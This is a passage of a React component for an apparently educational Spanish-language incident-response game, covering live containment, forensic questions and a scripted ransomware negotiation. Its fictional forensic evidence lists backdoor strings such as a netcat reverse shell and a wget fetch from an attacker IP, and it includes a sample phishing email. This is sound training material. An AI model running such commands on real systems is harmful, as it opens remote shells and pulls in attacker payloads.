import { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { guardarProgreso } from '../utils/progreso'
import { sonidoExito, sonidoError, sonidoMisionCompleta } from '../utils/sonidos'

const C = {
  cyan: '#00fff7', violet: '#a855f7', pink: '#f472b6',
  bg: '#080b18', sidebar: '#0b0f1e', card: '#0f1326',
  border: 'rgba(255,255,255,0.1)',
}

// ============ INCIDENTE 1: CRISIS EN TIEMPO REAL ============
const DURACION_1 = 180

const alertasIniciales = [
  { id: 'a1', nivel: 'CRÍTICO', sistema: 'Servidor Web', mensaje: 'Acceso root no autorizado detectado', icono: '🔴', resuelta: false, tiempo: 0 },
  { id: 'a2', nivel: 'CRÍTICO', sistema: 'Base de Datos', mensaje: 'Exfiltración de datos en curso — 2.3GB transferidos', icono: '🔴', resuelta: false, tiempo: 15 },
  { id: 'a3', nivel: 'ALTO', sistema: 'Active Directory', mensaje: 'Creación masiva de usuarios administradores', icono: '🟠', resuelta: false, tiempo: 30 },
  { id: 'a4', nivel: 'ALTO', sistema: 'Red corporativa', mensaje: 'Tráfico cifrado sospechoso hacia IP externa 91.108.4.177', icono: '🟠', resuelta: false, tiempo: 45 },
  { id: 'a5', nivel: 'MEDIO', sistema: 'Correo corporativo', mensaje: 'Envío masivo de emails desde cuenta comprometida', icono: '🟡', resuelta: false, tiempo: 60 },
  { id: 'a6', nivel: 'MEDIO', sistema: 'VPN', mensaje: 'Conexiones simultáneas desde 3 países diferentes', icono: '🟡', resuelta: false, tiempo: 75 },
  { id: 'a7', nivel: 'BAJO', sistema: 'Antivirus', mensaje: 'Deshabilitado en 14 estaciones de trabajo', icono: '🟢', resuelta: false, tiempo: 90 },
]

const accionesIncidente1 = [
  { id: 'ac1', titulo: '🔌 Aislar servidor web', desc: 'Desconecta el servidor web de la red.', resuelve: ['a1'], xp: 150, correcto: true, consecuencia: 'Servidor web aislado. El atacante perdió acceso.' },
  { id: 'ac2', titulo: '🗄️ Cortar acceso a base de datos', desc: 'Revoca todos los permisos y corta conexiones activas.', resuelve: ['a2'], xp: 200, correcto: true, consecuencia: 'Exfiltración detenida. 2.3GB comprometidos pero se evitó más daño.' },
  { id: 'ac3', titulo: '👤 Resetear Active Directory', desc: 'Deshabilita cuentas creadas en las últimas 2 horas.', resuelve: ['a3'], xp: 180, correcto: true, consecuencia: 'Cuentas maliciosas eliminadas. El atacante perdió persistencia.' },
  { id: 'ac4', titulo: '🚫 Bloquear IP en firewall', desc: 'Agrega 91.108.4.177 al blacklist.', resuelve: ['a4'], xp: 120, correcto: true, consecuencia: 'IP bloqueada. Canal de comunicación del atacante cortado.' },
  { id: 'ac5', titulo: '📧 Suspender cuenta comprometida', desc: 'Deshabilita la cuenta y notifica a destinatarios.', resuelve: ['a5'], xp: 100, correcto: true, consecuencia: 'Cuenta suspendida. 847 destinatarios notificados.' },
  { id: 'ac6', titulo: '🔐 Revocar sesiones VPN', desc: 'Fuerza cierre de todas las sesiones VPN activas.', resuelve: ['a6'], xp: 130, correcto: true, consecuencia: 'Sesiones VPN revocadas. Conexiones no autorizadas cortadas.' },
  { id: 'ac7', titulo: '🛡️ Reinstalar agente antivirus', desc: 'Despliega el agente AV en estaciones afectadas.', resuelve: ['a7'], xp: 80, correcto: true, consecuencia: 'Antivirus restaurado. 3 troyanos adicionales detectados.' },
  { id: 'ac8', titulo: '📢 Apagar todo sin plan', desc: 'Parar toda la operación para detener el ataque.', resuelve: [], xp: -150, correcto: false, consecuencia: 'Error. El atacante destruyó evidencia antes del apagado.' },
  { id: 'ac9', titulo: '💰 Pagar rescate', desc: 'Contactar al atacante y pagar para detener el ataque.', resuelve: [], xp: -300, correcto: false, consecuencia: 'Error crítico. El pago no garantiza nada y el ataque escala.' },
]

const logsIncidente1 = [
  { t: 5, msg: '⚠ IDS: Patrón de ataque APT detectado', color: '#f87171' },
  { t: 20, msg: '🔴 SIEM: Ataque coordinado en múltiples sistemas', color: '#f87171' },
  { t: 40, msg: '📡 Firewall: 14,291 paquetes bloqueados en 60s', color: '#fbbf24' },
  { t: 65, msg: '🔴 BD: Conexión externa no autorizada activa', color: '#f87171' },
  { t: 90, msg: '⚠ AD: 23 cuentas admin creadas en 30 min', color: '#f87171' },
  { t: 120, msg: '💀 CRÍTICO: Atacante intentando acceder a backups', color: '#f87171' },
]

// ============ INCIDENTE 2: INVESTIGACIÓN FORENSE ============
const evidencias = [
  {
    id: 'e1', tipo: 'LOG', titulo: 'Auth.log del servidor', contenido: `[2025-05-28 02:14:33] SSH login FAILED user=admin from 91.108.4.177
[2025-05-28 02:14:41] SSH login FAILED user=root from 91.108.4.177  
[2025-05-28 02:15:02] SSH login SUCCESS user=deploy from 91.108.4.177
[2025-05-28 02:15:08] sudo: deploy : TTY=pts/1 ; USER=root
[2025-05-28 02:15:09] su: Successful su for root by deploy`, pista: 'El atacante encontró credenciales válidas del usuario "deploy" tras fallar con admin y root.' },
  {
    id: 'e2', tipo: 'TRÁFICO', titulo: 'Captura de red pcap', contenido: `CONEXIÓN SALIENTE DETECTADA:
Origen: 192.168.1.10 (Servidor Web)
Destino: 91.108.4.177:4444
Protocolo: TCP cifrado
Tamaño total: 2.3 GB
Duración: 47 minutos
Inicio: 02:16:00 | Fin: 03:03:00`, pista: 'Puerto 4444 es típico de shells inversas (netcat, Metasploit). El atacante estableció un C2.' },
  {
    id: 'e3', tipo: 'ARCHIVO', titulo: 'Archivo sospechoso encontrado', contenido: `/tmp/.hidden/sysupdate (ejecutable)
MD5: 7f4a2b9c1e8d3f6a9b2c4d5e8f1a3b7c
Tamaño: 2.1 MB
Creado: 2025-05-28 02:15:45
Permisos: rwxr-xr-x root root
Strings: ["nc -e /bin/sh", "crontab", "wget http://91.108.4.177"]`, pista: 'El archivo es un backdoor con persistencia vía crontab. El atacante instaló un mecanismo de acceso permanente.' },
  {
    id: 'e4', tipo: 'EMAIL', titulo: 'Correo de phishing original', contenido: `De: soporte@micros0ft-update.com
Para: deploy@empresa.com
Asunto: Actualización urgente de seguridad
Fecha: 2025-05-27 15:42:00

"Estimado usuario, su cuenta requiere verificación urgente.
Haga clic aquí: http://micros0ft-update.com/verify?token=..."

[ADJUNTO]: update_security.exe (descargado a las 16:01)`, pista: 'El vector inicial fue phishing. El usuario "deploy" descargó el malware 19 minutos después del correo.' },
]

const preguntasForenses = [
  {
    id: 'pf1', pregunta: '¿Cuál fue el vector inicial del ataque?', opciones: [
      { id: 'a', texto: 'Exploit de vulnerabilidad en el servidor web', correcto: false, razon: 'No hay evidencia de exploit. El acceso fue por credenciales comprometidas.' },
      { id: 'b', texto: 'Phishing — el usuario deploy descargó malware', correcto: true, razon: 'Correcto. El correo de micros0ft-update.com inició la cadena de ataque.' },
      { id: 'c', texto: 'Ataque de fuerza bruta SSH', correcto: false, razon: 'Hubo intentos fallidos pero el acceso fue con credenciales válidas comprometidas.' },
      { id: 'd', texto: 'Insider threat — empleado malicioso', correcto: false, razon: 'El usuario deploy fue víctima, no el atacante.' },
    ], xp: 100,
  },
  {
    id: 'pf2', pregunta: '¿A qué hora exacta el atacante obtuvo acceso root?', opciones: [
      { id: 'a', texto: '02:14:33', correcto: false, razon: 'Esa fue la primera tentativa fallida, no el acceso exitoso.' },
      { id: 'b', texto: '02:15:02', correcto: false, razon: 'Esa fue la hora del login SSH exitoso, pero aún sin root.' },
      { id: 'c', texto: '02:15:09', correcto: true, razon: 'Correcto. El comando su exitoso para root fue a las 02:15:09.' },
      { id: 'd', texto: '02:16:00', correcto: false, razon: 'Esa fue la hora en que inició la exfiltración de datos, no el acceso root.' },
    ], xp: 120,
  },
  {
    id: 'pf3', pregunta: '¿Cuál es el mecanismo de persistencia instalado?', opciones: [
      { id: 'a', texto: 'Usuario administrador creado en AD', correcto: false, razon: 'Eso fue en otro sistema. En este servidor el mecanismo es diferente.' },
      { id: 'b', texto: 'Webshell en el servidor web', correcto: false, razon: 'No hay evidencia de webshell en los archivos analizados.' },
      { id: 'c', texto: 'Backdoor con persistencia vía crontab', correcto: true, razon: 'Correcto. El archivo /tmp/.hidden/sysupdate usa crontab para reiniciarse.' },
      { id: 'd', texto: 'Servicio de Windows modificado', correcto: false, razon: 'Es un servidor Linux, no Windows.' },
    ], xp: 130,
  },
  {
    id: 'pf4', pregunta: '¿Cuántos datos fueron exfiltrados y hacia dónde?', opciones: [
      { id: 'a', texto: '2.3 GB hacia 91.108.4.177 por puerto 4444', correcto: true, razon: 'Correcto. La captura de red confirma 2.3GB hacia esa IP en 47 minutos.' },
      { id: 'b', texto: '14 GB hacia servidor desconocido', correcto: false, razon: 'La captura de red muestra 2.3GB, no 14GB.' },
      { id: 'c', texto: '2.3 GB hacia 91.108.4.177 por puerto 22', correcto: false, razon: 'El puerto SSH es 22 pero la exfiltración usó puerto 4444 (shell inversa).' },
      { id: 'd', texto: 'No hubo exfiltración confirmada', correcto: false, razon: 'La captura de red confirma claramente la transferencia de 2.3GB.' },
    ], xp: 110,
  },
]

// ============ INCIDENTE 3: NEGOCIACIÓN CON ATACANTE ============
const guionNegociacion = [
  { de: 'atacante', texto: 'Buenas noches. Somos el grupo Phantom. Hemos cifrado 847GB de sus datos corporativos y tenemos acceso a sus sistemas de backup.', tiempo: 1000 },
  { de: 'atacante', texto: 'Tienen 24 horas para pagar 50 BTC (~$3.2M USD) o publicamos toda la información de sus clientes en la dark web.', tiempo: 4000 },
  { de: 'atacante', texto: 'Prueba de vida: aquí está una muestra de los datos que tenemos.', tiempo: 7000 },
  { de: 'atacante', texto: '¿Están dispuestos a negociar?', tiempo: 10000 },
]

const opcionesNegociacion = [
  [
    { id: 'n1a', texto: 'Sí, estamos dispuestos a negociar. ¿Pueden darnos más tiempo?', siguiente: 1, xp: 50, tipo: 'neutral', razon: 'Ganar tiempo es una táctica válida para continuar la recuperación.' },
    { id: 'n1b', texto: 'No pagaremos nada. Hagan lo que quieran.', siguiente: 2, xp: -100, tipo: 'malo', razon: 'Respuesta agresiva que puede acelerar la publicación de datos.' },
    { id: 'n1c', texto: 'Necesitamos verificar que realmente tienen los datos antes de cualquier acuerdo.', siguiente: 3, xp: 80, tipo: 'bueno', razon: 'Excelente. Verificar la prueba de vida es protocolo estándar en negociaciones.' },
    { id: 'n1d', texto: 'Estamos contactando a las autoridades ahora mismo.', siguiente: 4, xp: 30, tipo: 'neutral', razon: 'Contactar autoridades es correcto pero mencionarlo puede acelerar acciones del atacante.' },
  ],
  [
    { id: 'n2a', texto: 'Necesitamos 72 horas para reunir los fondos.', siguiente: 5, xp: 60, tipo: 'neutral', razon: 'Ganar tiempo permite a IT continuar la recuperación.' },
    { id: 'n2b', texto: 'Podemos pagar 10 BTC ahora mismo.', siguiente: 6, xp: -150, tipo: 'malo', razon: 'Nunca ofrezcas pagar — muestra que tienes intención de ceder.' },
    { id: 'n2c', texto: '¿Cuál es el mínimo que aceptarían?', siguiente: 7, xp: 40, tipo: 'neutral', razon: 'Buscar el mínimo da información pero también muestra disposición a pagar.' },
  ],
  [
    { id: 'n3a', texto: 'Envíen una muestra verificable de los archivos cifrados.', siguiente: 8, xp: 100, tipo: 'bueno', razon: 'Correcto. La muestra debe ser verificable y única para confirmar posesión real.' },
    { id: 'n3b', texto: 'Les creemos, ¿cuáles son sus condiciones finales?', siguiente: 9, xp: -80, tipo: 'malo', razon: 'Nunca aceptes afirmaciones sin verificación. Pueden estar bluffeando.' },
    { id: 'n3c', texto: 'Necesitamos el hash de los archivos cifrados para verificar.', siguiente: 8, xp: 90, tipo: 'bueno', razon: 'Pedir el hash es una forma técnica válida de verificación.' },
  ],
]

const mensajesAtacante = {
  1: 'Podemos darles 48 horas adicionales, pero el precio sube a 60 BTC. ¿Aceptan?',
  2: 'Interesante. Publicamos la primera parte de los datos en 2 horas entonces.',
  3: 'Aquí tienen una muestra: [ARCHIVO CIFRADO - 500MB]. Tenemos todo.',
  4: 'Las autoridades no pueden ayudarles en tiempo real. El reloj sigue corriendo.',
  5: 'De acuerdo. 72 horas pero el precio es ahora 70 BTC. Confirmen.',
  6: 'Sabemos que tienen más. El precio mínimo es 45 BTC.',
  7: 'El mínimo es 40 BTC. ¿Tienen esa cantidad disponible?',
  8: 'Aquí el hash SHA-256: 7f4a2b9c1e8d3f6a... Están verificados.',
  9: 'Excelente. Entonces acordamos 50 BTC en 24 horas. ¿Confirman?',
}

export default function Mision6({ session }) {
  const navigate = useNavigate()
  const [fase, setFase] = useState(0) // 0=crisis, 1=forense, 2=negociacion, 3=fin

  // FASE 0 — Crisis
  const [tiempo1, setTiempo1] = useState(DURACION_1)
  const [alertas, setAlertas] = useState([alertasIniciales[0]])
  const [logs, setLogs] = useState([])
  const [accionando, setAccionando] = useState(null)
  const [progreso1, setProgreso1] = useState(0)
  const [score1, setScore1] = useState(0)
  const [accionesUsadas1, setAccionesUsadas1] = useState([])
  const [accionActiva, setAccionActiva] = useState(null)
  const logsRef = useRef(null)

  // FASE 1 — Forense
  const [evidenciaActual, setEvidenciaActual] = useState(0)
  const [preguntaActual, setPreguntaActual] = useState(0)
  const [respuestaForense, setRespuestaForense] = useState(null)
  const [score2, setScore2] = useState(0)
  const [modoForense, setModoForense] = useState('evidencias') // evidencias | preguntas

  // FASE 2 — Negociación
  const [mensajesNeg, setMensajesNeg] = useState([])
  const [turnoNeg, setTurnoNeg] = useState(0)
  const [opcionesActuales, setOpcionesActuales] = useState(opcionesNegociacion[0])
  const [score3, setScore3] = useState(0)
  const [negFinished, setNegFinished] = useState(false)
  const [respuestaNeg, setRespuestaNeg] = useState(null)
  const chatRef = useRef(null)

  const scoreTotal = score1 + score2 + score3

  // ---- FASE 0: TIMER Y LOGS ----
  useEffect(() => {
    if (fase !== 0) return
    if (tiempo1 <= 0) return
    const t = setInterval(() => setTiempo1(s => s - 1), 1000)
    return () => clearInterval(t)
  }, [fase, tiempo1])

  useEffect(() => {
    if (fase !== 0) return
    const transcurrido = DURACION_1 - tiempo1
    const nuevas = alertasIniciales.filter(a => a.tiempo <= transcurrido && !alertas.find(x => x.id === a.id))
    if (nuevas.length > 0) setAlertas(prev => [...prev, ...nuevas])
  }, [tiempo1, fase])

  useEffect(() => {
    if (fase !== 0) return
    const transcurrido = DURACION_1 - tiempo1
    const nuevosLogs = logsIncidente1.filter(l => l.t <= transcurrido && !logs.find(x => x.t === l.t))
    if (nuevosLogs.length > 0) {
      setLogs(prev => [...prev, ...nuevosLogs])
      setTimeout(() => { if (logsRef.current) logsRef.current.scrollTop = logsRef.current.scrollHeight }, 100)
    }
  }, [tiempo1, fase])

  // ---- FASE 2: GUION NEGOCIACION ----
  useEffect(() => {
    if (fase !== 2) return
    guionNegociacion.forEach(msg => {
      setTimeout(() => setMensajesNeg(prev => [...prev, msg]), msg.tiempo)
    })
  }, [fase])

  useEffect(() => {
    if (chatRef.current) chatRef.current.scrollTop = chatRef.current.scrollHeight
  }, [mensajesNeg])

  function ejecutarAccion1(accion) {
    if (accionando || accionesUsadas1.includes(accion.id)) return
    setAccionActiva(accion)
setAccionando(accion.id)
setTimeout(() => {
  accion.correcto ? sonidoExito() : sonidoError()
  setAccionesUsadas1(prev => [...prev, accion.id])
  setScore1(prev => prev + Math.max(0, accion.xp))
      if (accion.resuelve.length > 0) {
        setAlertas(prev => prev.map(a => accion.resuelve.includes(a.id) ? { ...a, resuelta: true } : a))
        setProgreso1(prev => Math.min(100, prev + (accion.resuelve.length / alertasIniciales.length) * 100))
      }
      setLogs(prev => [...prev, { t: DURACION_1 - tiempo1, msg: accion.correcto ? `✅ ${accion.consecuencia}` : `❌ ${accion.consecuencia}`, color: accion.correcto ? '#4ade80' : '#f87171' }])
      setAccionando(null)
      setAccionActiva(null)
      setTimeout(() => { if (logsRef.current) logsRef.current.scrollTop = logsRef.current.scrollHeight }, 100)
    }, accion.correcto ? 800 : 400)
  }

function elegirForense(op) {
  if (respuestaForense) return
  op.correcto ? sonidoExito() : sonidoError()
  setRespuestaForense(op)
  }

  function siguienteForense() {
    if (preguntaActual + 1 >= preguntasForenses.length) {
      setFase(2)
    } else {
      setPreguntaActual(i => i + 1)
      setRespuestaForense(null)
    }
  }

function elegirNeg(op) {
  if (respuestaNeg) return
  op.tipo === 'bueno' ? sonidoExito() : op.tipo === 'malo' ? sonidoError() : null
  setRespuestaNeg(op)
    setScore3(prev => prev + Math.max(0, op.xp))
    setMensajesNeg(prev => [...prev, { de: 'yo', texto: op.texto }])
    setTimeout(() => {
      if (mensajesAtacante[op.siguiente]) {
        setMensajesNeg(prev => [...prev, { de: 'atacante', texto: mensajesAtacante[op.siguiente] }])
      }
      if (turnoNeg + 1 >= opcionesNegociacion.length || op.tipo === 'malo') {
        setNegFinished(true)
        setTimeout(() => {
sonidoMisionCompleta()
setFase(3)
guardarProgreso(6, score1 + score2 + score3)
        }, 2000)
      } else {
        setTurnoNeg(i => i + 1)
        setOpcionesActuales(opcionesNegociacion[Math.min(turnoNeg + 1, opcionesNegociacion.length - 1)])
        setRespuestaNeg(null)
      }
    }, 1500)
  }

  const tiempoColor1 = tiempo1 > 90 ? '#4ade80' : tiempo1 > 45 ? '#fbbf24' : '#f87171'
  const timerStr1 = `${String(Math.floor(tiempo1 / 60)).padStart(2, '0')}:${String(tiempo1 % 60).padStart(2, '0')}`
  const alertasCriticas = alertas.filter(a => !a.resuelta && a.nivel === 'CRÍTICO').length

  // ===== PANTALLA FINAL =====
  if (fase === 3) return (
    <div style={{ minHeight: '100vh', background: C.bg, display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'system-ui, sans-serif', color: '#e2e8f0' }}>
      <div style={{ background: C.sidebar, border: `1px solid ${C.border}`, borderRadius: '20px', padding: '56px', textAlign: 'center', maxWidth: '600px', width: '100%' }}>
        <div style={{ fontSize: '64px', marginBottom: '20px' }}>{scoreTotal >= 700 ? '🏆' : scoreTotal >= 400 ? '🎯' : '💀'}</div>
        <div style={{ fontSize: '14px', color: '#64748b', letterSpacing: '2px', marginBottom: '10px' }}>MISIÓN 6 COMPLETADA</div>
        <div style={{ fontSize: '28px', fontWeight: 800, color: scoreTotal >= 700 ? '#4ade80' : scoreTotal >= 400 ? C.cyan : '#f87171', marginBottom: '16px' }}>
          {scoreTotal >= 700 ? '¡Respuesta de élite!' : scoreTotal >= 400 ? 'Incidente contenido' : 'El ataque tuvo éxito'}
        </div>
        <div style={{ fontSize: '48px', fontWeight: 900, color: '#fbbf24', marginBottom: '20px' }}>+{scoreTotal} XP</div>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '12px', marginBottom: '24px' }}>
          {[
            { label: 'Crisis en tiempo real', score: score1, max: 960 },
            { label: 'Análisis forense', score: score2, max: 460 },
            { label: 'Negociación', score: score3, max: 230 },
          ].map((s, i) => (
            <div key={i} style={{ background: C.card, border: `1px solid ${C.border}`, borderRadius: '12px', padding: '16px' }}>
              <div style={{ fontSize: '12px', color: '#64748b', marginBottom: '8px' }}>{s.label}</div>
              <div style={{ fontSize: '22px', fontWeight: 800, color: C.cyan }}>+{s.score}</div>
              <div style={{ fontSize: '11px', color: '#64748b' }}>de {s.max} XP</div>
            </div>
          ))}
        </div>
        <div style={{ display: 'flex', gap: '14px', justifyContent: 'center' }}>
          <button onClick={() => navigate('/')} style={{ padding: '14px 28px', borderRadius: '10px', border: `1px solid ${C.border}`, background: 'transparent', color: '#94a3b8', fontSize: '16px', cursor: 'pointer', fontFamily: 'inherit' }}>Volver al Hub</button>
          <button onClick={() => navigate('/mision/7')} style={{ padding: '14px 28px', borderRadius: '10px', border: 'none', background: `linear-gradient(to right, ${C.cyan}, ${C.violet})`, color: '#080b18', fontSize: '16px', fontWeight: 700, cursor: 'pointer', fontFamily: 'inherit' }}>Jefe Final →</button>
        </div>
      </div>
    </div>
  )

  // ===== FASE 0: CRISIS EN TIEMPO REAL =====
  if (fase === 0) return (
    <div style={{ minHeight: '100vh', background: C.bg, color: '#e2e8f0', fontFamily: 'system-ui, sans-serif', fontSize: '15px', display: 'flex', flexDirection: 'column' }}>
      <header style={{ height: '64px', background: '#0d0a1a', borderBottom: '2px solid #f87171', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 28px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <button onClick={() => navigate('/')} style={{ background: 'none', border: 'none', color: '#64748b', cursor: 'pointer', fontSize: '22px' }}>←</button>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#f87171' }} />
            <div>
              <div style={{ fontSize: '11px', color: '#f87171', letterSpacing: '2px', fontWeight: 700 }}>FASE 1/3 — INCIDENTE ACTIVO</div>
              <div style={{ fontSize: '17px', fontWeight: 700, color: 'white' }}>Crisis en Tiempo Real</div>
            </div>
          </div>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
          {alertasCriticas > 0 && <div style={{ background: 'rgba(248,113,113,0.2)', border: '1px solid #f87171', borderRadius: '8px', padding: '6px 14px', fontSize: '13px', color: '#f87171', fontWeight: 700 }}>🔴 {alertasCriticas} CRÍTICAS</div>}
          <div style={{ background: `${tiempoColor1}11`, border: `1px solid ${tiempoColor1}44`, borderRadius: '8px', padding: '6px 14px', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: tiempoColor1 }} />
            <span style={{ fontSize: '18px', fontWeight: 800, color: tiempoColor1, fontFamily: 'monospace' }}>{timerStr1}</span>
          </div>
          <div style={{ fontSize: '17px', fontWeight: 700, color: '#fbbf24' }}>⚡ {score1} XP</div>
        </div>
      </header>

      <div style={{ height: '4px', background: 'rgba(255,255,255,0.05)' }}>
        <div style={{ height: '100%', background: `linear-gradient(to right, #f87171, #fbbf24, #4ade80)`, width: `${progreso1}%`, transition: 'width 0.5s' }} />
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '280px 1fr 280px', flex: 1, overflow: 'hidden' }}>

        {/* ALERTAS */}
        <div style={{ background: C.sidebar, borderRight: `1px solid ${C.border}`, overflowY: 'auto', display: 'flex', flexDirection: 'column' }}>
          <div style={{ padding: '16px 20px', borderBottom: `1px solid ${C.border}` }}>
            <div style={{ fontSize: '13px', fontWeight: 700, color: '#f87171', letterSpacing: '2px', marginBottom: '4px' }}>🚨 ALERTAS</div>
            <div style={{ fontSize: '12px', color: '#64748b' }}>{alertas.filter(a => !a.resuelta).length} activas · {alertas.filter(a => a.resuelta).length} resueltas</div>
          </div>
          <div style={{ flex: 1, overflowY: 'auto', padding: '12px' }}>
            {alertas.map(alerta => (
              <div key={alerta.id} style={{ background: alerta.resuelta ? 'rgba(74,222,128,0.06)' : alerta.nivel === 'CRÍTICO' ? 'rgba(248,113,113,0.08)' : 'rgba(251,191,36,0.06)', border: `1px solid ${alerta.resuelta ? '#4ade8033' : alerta.nivel === 'CRÍTICO' ? '#f8717133' : '#fbbf2433'}`, borderRadius: '10px', padding: '12px', marginBottom: '8px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                  <span style={{ fontSize: '11px', fontWeight: 700, color: alerta.resuelta ? '#4ade80' : alerta.nivel === 'CRÍTICO' ? '#f87171' : '#fbbf24' }}>{alerta.resuelta ? '✅ RESUELTA' : `${alerta.icono} ${alerta.nivel}`}</span>
                  <span style={{ fontSize: '11px', color: '#64748b' }}>{alerta.sistema}</span>
                </div>
                <div style={{ fontSize: '12px', color: '#94a3b8', textDecoration: alerta.resuelta ? 'line-through' : 'none' }}>{alerta.mensaje}</div>
              </div>
            ))}
            {alertas.length < alertasIniciales.length && <div style={{ textAlign: 'center', fontSize: '12px', color: '#64748b', padding: '8px' }}>⏳ Más alertas aparecerán...</div>}
          </div>
          <div style={{ padding: '16px', borderTop: `1px solid ${C.border}` }}>
            <div style={{ fontSize: '12px', color: '#64748b', marginBottom: '6px' }}>INCIDENTE CONTENIDO</div>
            <div style={{ height: '6px', background: 'rgba(255,255,255,0.08)', borderRadius: '3px', marginBottom: '4px' }}>
              <div style={{ height: '100%', borderRadius: '3px', background: `linear-gradient(to right, ${C.cyan}, ${C.violet})`, width: `${progreso1}%`, transition: 'width 0.5s' }} />
            </div>
            <div style={{ fontSize: '13px', fontWeight: 700, color: C.cyan }}>{Math.round(progreso1)}%</div>
          </div>
        </div>

        {/* LOGS */}
        <div style={{ display: 'flex', flexDirection: 'column', borderRight: `1px solid ${C.border}` }}>
          <div style={{ padding: '14px 24px', background: C.card, borderBottom: `1px solid ${C.border}` }}>
            <div style={{ fontSize: '13px', fontWeight: 700, color: C.cyan, letterSpacing: '2px' }}>📡 LOG EN VIVO — SOC</div>
          </div>
          <div ref={logsRef} style={{ flex: 1, overflowY: 'auto', padding: '16px 24px', fontFamily: 'monospace', fontSize: '13px' }}>
            <div style={{ color: C.cyan, marginBottom: '6px' }}>{'>'} Sistema de respuesta iniciado...</div>
            <div style={{ color: '#f87171', marginBottom: '12px', fontWeight: 700 }}>{'>'} ⚠ ALERTA CRÍTICA: Intrusión en múltiples sistemas</div>
            {logs.map((log, i) => (
              <div key={i} style={{ color: log.color, marginBottom: '6px' }}>
                <span style={{ color: '#64748b' }}>[{String(Math.floor((DURACION_1 - log.t) / 60)).padStart(2, '0')}:{String((DURACION_1 - log.t) % 60).padStart(2, '0')}]</span> {log.msg}
              </div>
            ))}
            {accionActiva && <div style={{ color: C.cyan, marginTop: '8px' }}>{'>'} Ejecutando: {accionActiva.titulo}... <span style={{ color: '#fbbf24' }}>en progreso</span></div>}
          </div>
          <div style={{ padding: '14px 24px', borderTop: `1px solid ${C.border}`, background: C.card, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ fontSize: '13px', color: '#64748b' }}>
              {alertas.filter(a => a.resuelta).length}/{alertasIniciales.length} alertas resueltas
            </div>
            <button onClick={() => setFase(1)}
              style={{ padding: '10px 20px', borderRadius: '8px', border: 'none', background: `linear-gradient(to right, ${C.cyan}, ${C.violet})`, color: '#080b18', fontSize: '14px', fontWeight: 700, cursor: 'pointer', fontFamily: 'inherit' }}>
              Pasar a investigación →
            </button>
          </div>
        </div>

        {/* ACCIONES */}
        <div style={{ background: C.sidebar, overflowY: 'auto', padding: '16px' }}>
          <div style={{ fontSize: '13px', fontWeight: 700, color: C.cyan, letterSpacing: '2px', marginBottom: '4px' }}>⚡ ACCIONES</div>
          <div style={{ fontSize: '11px', color: '#64748b', marginBottom: '12px' }}>Ejecuta acciones para contener el incidente</div>
          {accionesIncidente1.map(accion => {
            const usada = accionesUsadas1.includes(accion.id)
            const enProceso = accionando === accion.id
            return (
              <div key={accion.id} onClick={() => !usada && !accionando && ejecutarAccion1(accion)}
                style={{ background: usada ? (accion.correcto ? 'rgba(74,222,128,0.06)' : 'rgba(248,113,113,0.06)') : C.card, border: `1px solid ${usada ? (accion.correcto ? '#4ade8033' : '#f8717133') : C.border}`, borderRadius: '10px', padding: '12px', marginBottom: '8px', cursor: usada || accionando ? 'default' : 'pointer', opacity: usada ? 0.7 : 1 }}>
                <div style={{ fontSize: '13px', fontWeight: 700, color: usada ? (accion.correcto ? '#4ade80' : '#f87171') : '#e2e8f0', marginBottom: '4px' }}>
                  {enProceso ? '⏳ ' : usada ? (accion.correcto ? '✅ ' : '❌ ') : ''}{accion.titulo}
                </div>
                <div style={{ fontSize: '11px', color: '#64748b' }}>{accion.desc}</div>
                {usada && <div style={{ fontSize: '11px', color: accion.correcto ? '#4ade80' : '#f87171', fontWeight: 600, marginTop: '4px' }}>{accion.xp > 0 ? `+${accion.xp} XP` : `${accion.xp} XP`}</div>}
              </div>
            )
          })}
        </div>
      </div>
    </div>
  )

  // ===== FASE 1: INVESTIGACIÓN FORENSE =====
  if (fase === 1) return (
    <div style={{ minHeight: '100vh', background: C.bg, color: '#e2e8f0', fontFamily: 'system-ui, sans-serif', fontSize: '15px', display: 'flex', flexDirection: 'column' }}>
      <header style={{ height: '64px', background: C.sidebar, borderBottom: `1px solid ${C.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 28px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div>
            <div style={{ fontSize: '11px', color: C.violet, letterSpacing: '2px', fontWeight: 700 }}>FASE 2/3 — INVESTIGACIÓN</div>
            <div style={{ fontSize: '17px', fontWeight: 700, color: 'white' }}>Análisis Forense del Incidente</div>
          </div>
        </div>
        <div style={{ fontSize: '17px', fontWeight: 700, color: '#fbbf24' }}>⚡ {score1 + score2} XP</div>
      </header>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', flex: 1, overflow: 'hidden' }}>

        {/* EVIDENCIAS */}
        <div style={{ borderRight: `1px solid ${C.border}`, overflowY: 'auto', padding: '24px' }}>
          <div style={{ fontSize: '14px', fontWeight: 700, color: C.violet, letterSpacing: '2px', marginBottom: '16px' }}>🔍 EVIDENCIAS RECOLECTADAS</div>
          <div style={{ display: 'flex', gap: '8px', marginBottom: '16px', flexWrap: 'wrap' }}>
            {evidencias.map((e, i) => (
              <button key={e.id} onClick={() => setEvidenciaActual(i)}
                style={{ padding: '6px 14px', borderRadius: '8px', border: `1px solid ${evidenciaActual === i ? C.violet : C.border}`, background: evidenciaActual === i ? `${C.violet}22` : 'transparent', color: evidenciaActual === i ? C.violet : '#64748b', fontSize: '12px', cursor: 'pointer', fontFamily: 'inherit', fontWeight: evidenciaActual === i ? 700 : 400 }}>
                {e.tipo}
              </button>
            ))}
          </div>
          <div style={{ background: C.card, border: `1px solid ${C.border}`, borderRadius: '12px', padding: '20px', marginBottom: '16px' }}>
